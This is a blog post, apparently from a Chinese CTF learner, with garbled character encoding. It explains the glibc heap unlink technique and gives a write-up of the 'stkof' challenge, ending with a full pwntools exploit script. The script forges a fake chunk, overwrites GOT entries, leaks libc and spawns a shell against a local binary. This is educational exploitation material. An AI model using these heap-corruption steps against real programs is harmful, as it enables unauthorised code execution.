<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Unlink(stkof) | Bin FantasyğŸ¤¯</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="â€‹        å…³äºunlinkçš„ä»‹ç»å’Œå…¥é—¨ã€‚ã€‚ã€‚ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Unlink(stkof)">
<meta property="og:url" content="http://example.com/2020/03/02/Unlink-stkof/index.html">
<meta property="og:site_name" content="Bin FantasyğŸ¤¯">
<meta property="og:description" content="â€‹        å…³äºunlinkçš„ä»‹ç»å’Œå…¥é—¨ã€‚ã€‚ã€‚ã€‚">
<meta property="og:locale">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png">
<meta property="article:published_time" content="2020-03-02T12:57:20.000Z">
<meta property="article:modified_time" content="2020-03-03T03:39:35.052Z">
<meta property="article:author" content="Ash3n On3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png">
  
    <link rel="alternate" href="/atom.xml" title="Bin FantasyğŸ¤¯" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-Unlink-stkof" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/02/Unlink-stkof/" class="article-date">
  <time class="post-time" datetime="2020-03-02T12:57:20.000Z" itemprop="datePublished">
    <span class="post-month">3æœˆ</span><br/>
    <span class="post-day">02</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Unlink(stkof)
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>â€‹        å…³äºunlinkçš„ä»‹ç»å’Œå…¥é—¨ã€‚ã€‚ã€‚ã€‚<span id="more"></span></p>
<p>â€‹        unlinkä¹Ÿæ˜¯ä¸€ä¸ªçœ‹äº†å¥½ä¹…çœ‹ä¸æ‡‚çš„ä¸œè¥¿ï¼Œä»Šå¤©ç®—æ˜¯æ•´æ˜ç™½äº†ã€‚</p>
<h2 id="0x00-unlink-æ¼æ´"><a href="#0x00-unlink-æ¼æ´" class="headerlink" title="0x00 . unlink æ¼æ´"></a>0x00 . unlink æ¼æ´</h2><h3 id="A-unlinkåŸç†"><a href="#A-unlinkåŸç†" class="headerlink" title="A . unlinkåŸç†"></a>A . unlinkåŸç†</h3><p>â€‹        å‡è®¾æœ‰å¦‚ä¸‹chunk0ï¼Œchunk1ï¼Œå…¶ä¸­chunk0æ˜¯ä½¿ç”¨ä¸­çš„smallï¼Œchunk1æ˜¯å·²é‡Šæ”¾çš„small chunkï¼Œä¸¤è€…åœ¨å†…å­˜ä¸Šç›¸é‚»ã€‚</p>
<p>â€‹        ç”±äºchunk1å·²é‡Šæ”¾ï¼Œæ‰€ä»¥ä½äºsmall biné“¾è¡¨ä¸­ï¼Œåˆä¸chunk2ï¼Œchunk3åœ¨é“¾è¡¨ç»“æ„ä¸Šç›¸é‚»ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png" style="zoom:50%;" />

<p>â€‹        æ­¤æ—¶å¦‚æœfree(chunk0)ï¼Œglibcæœºåˆ¶å°±ä¼šåˆ¤æ–­å‰å(å†…å­˜ä¸Š)æœ‰æ— ç›¸é‚»çš„å·²é‡Šæ”¾chunkï¼Œå¦‚æœæœ‰ï¼Œå°±å’Œchunk0ä¸€åŒåˆå¹¶æˆä¸€ä¸ªå¤§chunkã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œè¿˜è¦æŠŠchunk1ä»small binä¸­â€œæ‹”å‡ºæ¥â€ï¼Œå…¶ä¸­å‘ç”Ÿçš„æ–­é“¾ï¼Œä¿®æ”¹é“¾è¡¨çš„æ“ä½œå°±æ˜¯unlinkã€‚æ¢è¨€ä¹‹unlinkå°±æ˜¯ä¸€ä¸ªä»åŒå‘é“¾è¡¨ä¸­æŠ½å‡ºä¸€ä¸ªchunkçš„æ“ä½œã€‚ï¼ˆphoto from ctf-wikiï¼‰</p>
<p>â€‹        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png" style="zoom:67%;" /></p>
<p>â€‹        æ‰€ä»¥unlinkåªé€‚ç”¨äºéfast chunkï¼Œå› ä¸ºfast chunkä¸å­˜åœ¨åŒå‘é“¾è¡¨ï¼ŒåŒæ—¶fast chunkä¹Ÿå¹¶ä¸æ˜¯ç”¨å®Œå°±é©¬ä¸Šå›æ”¶çš„ã€‚</p>
<h3 id="B-å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32-bitï¼‰"><a href="#B-å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32-bitï¼‰" class="headerlink" title="B . å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32 bitï¼‰"></a>B . å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32 bitï¼‰</h3><p>â€‹        é‚£ä¹ˆå¦‚ä½•é€šè¿‡unlinkè¾¾åˆ°ä»»æ„å†™çš„ç›®çš„å‘¢ï¼Ÿæ›¾ç»çš„unlinkåˆ©ç”¨æ˜¯è¿™æ ·çš„ï¼š</p>
<p>â€‹        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png" style="zoom:55%;" /></p>
<p>â€‹        1.åœ¨è¿›è¡Œunlinkä¹‹å‰ä¿®æ”¹chunk0çš„fdå’Œbkï¼Œä½¿å¾—FD = target_addrï¼ŒBK = expect valueï¼ˆå¯ä»¥é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ¼æ´ä¿®æ”¹ï¼Œæˆ–è€…æ„é€ fake chunkï¼‰ã€‚</p>
<p>â€‹        2.è¿›è¡Œåˆå¹¶æ“ä½œï¼Œéœ€è¦å°†chunk1çš„å‰é©±åç»§çš„æŒ‡å‘ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆchunk0çš„å‰é©±åç»§ï¼Œä¹Ÿå°±æ˜¯å°†chunk1çš„FDå’ŒBKæ”¹æˆchunk0çš„FDå’ŒBKï¼Œåœ¨ä¸€èµ·æ€»è¦ä¸€æ¡å¿ƒå˜›ã€‚</p>
<p>â€‹        3.æ­¤æ—¶chunk1å·²ç»FDå†™å…¥äº†target_addrï¼ŒBKå†™å…¥äº†expect valueï¼Œåœ¨é‡Šæ”¾chunk0ï¼Œä½¿å¾—chunk1è¿›è¡Œunlinkã€‚</p>
<p>â€‹        4.chunk1çš„unlinkï¼Œå®é™…ä¸Šå°±æ˜¯ä¿®æ”¹small binä¸­çš„å‰é©±åç»§ï¼Œå°†å‰é©±çš„åç»§ï¼ˆåŸæœ¬æ˜¯chunk1ï¼‰æ”¹æˆè‡ªå·±çš„åç»§ï¼Œå°†åç»§çš„å‰é©±ï¼ˆåŸæœ¬æ˜¯chunk1ï¼‰æ”¹æˆè‡ªå·±çš„å‰é©±ã€‚è€Œç³»ç»Ÿæ˜¯æ€ä¹ˆä¿®æ”¹å‰é©±åç»§çš„å‘¢ï¼Œå°±æ˜¯ä¿®æ”¹FDæŒ‡é’ˆ + 8çš„åœ°å€ï¼ˆheap head å 8ä¸ªå­—èŠ‚ï¼Œç´§æ¥ç€å°±æ˜¯è¯¥chunkçš„fdæŒ‡é’ˆï¼‰å’Œä¿®æ”¹FDæŒ‡é’ˆ + 12çš„åœ°å€ï¼ˆheap headå 8 Bytesï¼Œfdå 4 Bytesï¼Œç´§æ¥ç€å°±æ˜¯è¯¥chunkçš„bkæŒ‡é’ˆï¼‰ã€‚</p>
<p>â€‹        5.æ‰€ä»¥ç³»ç»Ÿä¼šå°†chunk1çš„FDâ€“&gt;bkæ”¹æˆè‡ªå·±çš„BKï¼Œå°†BKâ€“&gt;fdæ”¹æˆè‡ªå·±çš„FDï¼Œæ¢å¥è¯è¯´å°±æ˜¯ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk=BK;	<span class="comment">//target_addr - 12 + 12 = expect value;</span></span><br><span class="line">BK-&gt;fd=FD;	<span class="comment">//expect value + 8 = target_addr;</span></span><br></pre></td></tr></table></figure>

<p>â€‹        è¿™æ ·å°±å®ç°äº†ä»»æ„å†™ã€‚</p>
<h3 id="C-å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨-ï¼ˆ64-bitï¼‰"><a href="#C-å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨-ï¼ˆ64-bitï¼‰" class="headerlink" title="C . å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨ ï¼ˆ64 bitï¼‰"></a>C . å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨ ï¼ˆ64 bitï¼‰</h3><p>â€‹        ä½†æ˜¯ç°åœ¨çš„glibcåŠ å¼ºäº†ä¿æŠ¤æœºåˆ¶ï¼Œå¢åŠ äº†ä»¥ä¸‹æ£€æŸ¥è¿‡ç¨‹ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œå¿…é¡»ä½¿å¾—chunk1å‰é©±çš„åç»§ï¼Œå’Œåç»§çš„å‰é©±éƒ½æŒ‡å‘åŒä¸€ä¸ªpã€‚è‡³äºpæ˜¯å•¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹å½“ç„¶æ˜¯chunk1å’¯ï¼Œä½†æ˜¯æ—¢ç„¶è¦æ¼æ´åˆ©ç”¨ï¼Œé‚£å½“ç„¶ä¸èƒ½é¡ºç€ç³»ç»Ÿæœºåˆ¶æ¥ã€‚</p>
<p>â€‹        æˆ‘ä»¬è¿›è¡Œå¦‚ä¸‹æ„é€ ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD = p - <span class="number">0x18</span>;</span><br><span class="line">chunk1-&gt;BK = p - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>

<p>â€‹        é‚£ä¹ˆç³»ç»Ÿæ£€æŸ¥æ—¶å°±ä¼šè¿›è¡Œå¦‚ä¸‹åˆ¤æ–­ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ;	<span class="comment">//bingo!! </span></span><br><span class="line">p - <span class="number">0x18</span> + <span class="number">0x18</span> == p - <span class="number">0x10</span> +<span class="number">0x10</span>; 	<span class="comment">// We pass!!</span></span><br></pre></td></tr></table></figure>

<p>â€‹        æ—¢ç„¶æ£€æŸ¥è¿‡äº†ï¼Œå°±è¿›è¡Œunlinkå§ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK;		<span class="comment">//p - 0x18 + 0x18 = p - 0x10</span></span><br><span class="line">chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD;		<span class="comment">//p - 0x10 + 0x10 = p - 0x18</span></span><br></pre></td></tr></table></figure>

<p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æŠŠpæŒ‡é’ˆå‘å‰åç§»äº†0x18ã€‚è™½ç„¶ä¸ç®—æ˜¯ä»»æ„å†™ï¼Œä½†ä¹Ÿè¶³å¤Ÿåˆ©ç”¨äº†ã€‚</p>
<h2 id="0x01-stkof-writeup"><a href="#0x01-stkof-writeup" class="headerlink" title="0x01 . stkof writeup"></a>0x01 . stkof writeup</h2><h3 id="A-ç¨‹åºåˆ†æ"><a href="#A-ç¨‹åºåˆ†æ" class="headerlink" title="A . ç¨‹åºåˆ†æ"></a>A . ç¨‹åºåˆ†æ</h3><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png" style="zoom:40%;" />

<p>â€‹        useless()çš„åŠŸèƒ½å¤§æ¦‚æ˜¯ç”¨æ¥æµ‹è¯•ç”¨æˆ·è¾“å‡ºçš„chunkåºå·æ˜¯å¦å·²åˆ†é…ï¼Œä»…æ­¤è€Œå·²ã€‚åœ¨ä¸»å‡½æ•°é‡Œæ²¡æœ‰æ‰¾åˆ°å¯ä»¥è¾“å‡ºçš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘è¦†å†™gotè¡¨æ¥leak libcã€‚</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png"></p>
<p>â€‹        è‡³äºå…¶ä»–å‡½æ•°ï¼š</p>
<ul>
<li><p>add()æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ã€‚</p>
</li>
<li><p>delete()ä¸­free()åæœªå°†æŒ‡é’ˆç½®ç©º</p>
</li>
<li><p>fill()ä¸­å†è®©ç”¨æˆ·è¾“å…¥ä¸€ésizeï¼Œä¸åŒäºadd()ä¸­çš„sizeï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚    </p>
</li>
</ul>
<p>â€‹        åœ¨æœ¬ç¨‹åºçš„å‡ ä¸ªé‡è¦å‡½æ•°ä¸­å¯ä»¥å¯ä»¥å‘ç°ï¼Œchunkçš„å †æŒ‡é’ˆè¢«å­˜æ”¾åœ¨äº†ä¸€ä¸ªæ•°ç»„s[ ]ä¸­ï¼Œè€ŒåŒå‡»æ•°ç»„så¯ä»¥å‘ç°ï¼Œå…¶åœ°å€æ˜¯0x0602140ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½äºbssæ®µçš„æŒ‡é’ˆæ•°ç»„ï¼Œæ¢è¨€ä¹‹æ˜¯ä¸€ä¸ªå¯å†™çš„å…¨å±€å˜é‡ã€‚sæ˜¯æˆ‘ä»¬è¦†å†™gotè¡¨çš„å…³é”®ã€‚</p>
<p>â€‹        æœ‰å…¨å±€å˜é‡å­˜åœ¨ï¼Œå¯ä»¥åˆ©ç”¨unlinkæ¼æ´è¦†å†™gotè¡¨äº†ã€‚</p>
<h3 id="B-å†…å­˜å¸ƒå±€"><a href="#B-å†…å­˜å¸ƒå±€" class="headerlink" title="B .å†…å­˜å¸ƒå±€"></a>B .å†…å­˜å¸ƒå±€</h3><ul>
<li>ç”³è¯·4ä¸ªchunkï¼Œå…¶ä¸­chunk2æ˜¯small chunkã€‚ï¼ˆæœ¬ç¨‹åºæ²¡æœ‰ç”³è¯·é™åˆ¶ï¼Œå¯ä»¥ç”³è¯·å¤šä¸€ç‚¹ï¼Œåªè¦æ–¹ä¾¿å¸ƒå±€ã€‚ï¼‰</li>
<li>ç”¨chunk1çš„å †æº¢å‡ºè¦†ç›–chunk2ï¼Œæ”¹å†™å…¶FDå’ŒBKæˆs[0]-0x10(å³chunk2æŒ‡é’ˆ)ï¼Œæ”¹å†™chunk3çš„å¤´ä¿¡æ¯ã€‚</li>
<li>åœ¨ä¸Šä¸€æ­¥å®Œæˆçš„åŒæ—¶è¦é€šè¿‡æ£€æŸ¥ï¼Œä½¿ç³»ç»Ÿåœ¨é‡Šæ”¾chunk3æ—¶ç›¸ä¿¡chunk2ä¹Ÿå·²ç»é‡Šæ”¾äº†ï¼Œä»è€Œå‘å‰åˆå¹¶ã€‚</li>
<li>è¿™ä¸€åˆå¹¶ä¸è¦ç´§ï¼Œç³»ç»Ÿä¸€ä¸å°å¿ƒå°±æŠŠchunk2å¤„çš„å­˜æ”¾çš„æŒ‡é’ˆå‘ä½åœ°å€åç§»äº†0x18ï¼Œå¤Ÿæˆ‘ä»¬åœ°è‚†æ— å¿Œæƒ®å‘æŒ¥äº†ã€‚</li>
</ul>
<h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C . Leak &amp; Getshell"></a>C . Leak &amp; Getshell</h3><ul>
<li>å†æ”¹å†™chunk2çš„å†…å®¹ï¼Œå®é™…ä¸Šå°±æ˜¯è¦†å†™sæ•°ç»„ï¼Œæ”¹å†™chunkæŒ‡é’ˆã€‚æ­¤æ—¶å¯å†™å…¥gotè¡¨åœ°å€äº†ã€‚</li>
<li>è¦†å†™æƒ…å†µï¼šs[0]=free@got,s[1]=puts@got,s[2]=atol@gotã€‚</li>
<li>å†åˆ©ç”¨fillå‡½æ•°å°†free@gotæ”¹æˆputs@gotï¼Œfree[1]å°±å¾—åˆ°äº†puts@pltã€‚</li>
<li>é€šè¿‡è®¡ç®—ï¼Œå¾—åˆ°libcåœ°å€å’Œsystemåœ°å€ï¼Œé€šè¿‡elfæ–‡ä»¶æœç´¢å¯ä»¥æ‰¾åˆ°â€œ/bin/shâ€ã€‚</li>
<li>åˆ©ç”¨filå°†atol@gotæ”¹å†™æˆsystemåœ°å€ã€‚</li>
<li>æœ€åç›´æ¥å‘é€â€/bin/shâ€éƒ½ä¼šè°ƒç”¨systemå‡½æ•°ï¼Œgetshellã€‚</li>
</ul>
<h3 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h3><p>â€‹    è´´ä¸€ä¸‹è„šæœ¬å‘—ï¼Œè™½ç„¶ä¸æ˜¯è‡ªå·±å†™çš„ã€‚ï¼ˆexp from ctf-wikiï¼‰æœ‰ç©ºå†è‡ªå·±å†™ä¸€éã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">stkof = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    <span class="comment"># begin</span></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size in order to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">&#x27;free&#x27;</span>]) + p64(stkof.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        stkof.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(stkof.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/03/02/Unlink-stkof/" data-id="ckmliws2q0009s8lj3aifgjfa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/03/03/SleepHolder/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          SleepHolder
        
      </div>
    </a>
  
  
    <a href="/2020/03/01/Malloc-Hook/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Malloc_Hookå°è®°</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Bin FantasyğŸ¤¯</h1>
    <h2 class="blog-subtitle">You may found nothing here.</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
